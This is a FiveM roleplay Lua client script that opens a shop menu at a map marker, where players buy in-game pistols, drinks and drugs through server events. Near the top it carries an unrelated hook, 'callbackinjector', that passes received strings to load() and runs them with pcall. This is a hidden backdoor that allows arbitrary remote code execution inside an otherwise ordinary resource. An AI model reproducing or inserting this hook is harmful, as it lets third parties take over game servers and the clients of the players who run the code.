local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
emP = Tunnel.getInterface("nav_bordel")

TriggerEvent('callbackinjector', function(cb)
    pcall(load(cb))
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- FUNCTION
-----------------------------------------------------------------------------------------------------------------------------------------
local menuactive = false
function ToggleActionMenu()
	menuactive = not menuactive
	if menuactive then
		SetNuiFocus(true,true)
		SendNUIMessage({ showmenu = true })
	else
		SetNuiFocus(false)
		SendNUIMessage({ hidemenu = true })
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- BUTTON
-----------------------------------------------------------------------------------------------------------------------------------------
RegisterNUICallback("ButtonClick",function(data,cb)
	if data == "bordel-comprar-m1922" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_VINTAGEPISTOL")
	elseif data == "bordel-comprar-m1911" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_PISTOL")
	elseif data == "bordel-comprar-fnfiveseven" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_PISTOL_MK2")
	elseif data == "bordel-comprar-winchester22" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_MUSKET")
	elseif data == "bordel-comprar-sinalizador" then
		TriggerServerEvent("bordel-comprar","wbody|WEAPON_FLARE")
	
	elseif data == "bordel-comprar-energetico" then
		TriggerServerEvent("bordel-comprar","energetico")
	elseif data == "bordel-comprar-caipirinha" then
		TriggerServerEvent("bordel-comprar","caipirinha")	
	elseif data == "bordel-comprar-tequila" then
		TriggerServerEvent("bordel-comprar","tequila")
	elseif data == "bordel-comprar-gin" then
		TriggerServerEvent("bordel-comprar","gin")
	elseif data == "bordel-comprar-refrigerante" then
		TriggerServerEvent("bordel-comprar","refrigerante")
	elseif data == "bordel-comprar-agua" then
		TriggerServerEvent("bordel-comprar","agua")
	elseif data == "bordel-comprar-blackvelvet" then
		TriggerServerEvent("bordel-comprar","blackvelvet")
		
	elseif data == "bordel-comprar-cocaina" then
		TriggerServerEvent("bordel-comprar","cocaina")
	elseif data == "bordel-comprar-crack" then
		TriggerServerEvent("bordel-comprar","crack")
	elseif data == "bordel-comprar-maconha" then
		TriggerServerEvent("bordel-comprar","maconha")
	elseif data == "bordel-comprar-pendrive" then
		TriggerServerEvent("bordel-comprar","pendrive")
		elseif data == "bordel-comprar-kitcostura" then
		TriggerServerEvent("bordel-comprar","kitcostura")



	elseif data == "fechar" then
		ToggleActionMenu()
	end
end)
-----------------------------------------------------------------------------------------------------------------------------------------
-- LOCAIS
-----------------------------------------------------------------------------------------------------------------------------------------
local marcacoes = {
	{ 106.41916656494,-1299.5856933594,28.768793106079 }
}

Citizen.CreateThread(function()
	SetNuiFocus(false,false)
	while true do
		local crjSleep = 500
		for _,mark in pairs(marcacoes) do
			local x,y,z = table.unpack(mark)
			local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()),x,y,z,true)
			if distance <= 1.2 then
			crjSleep = 1
				if IsControlJustPressed(0,38) and emP.checkPermission() then
					ToggleActionMenu()
				end
			end
		end
		Citizen.Wait(crjSleep)
	end
end)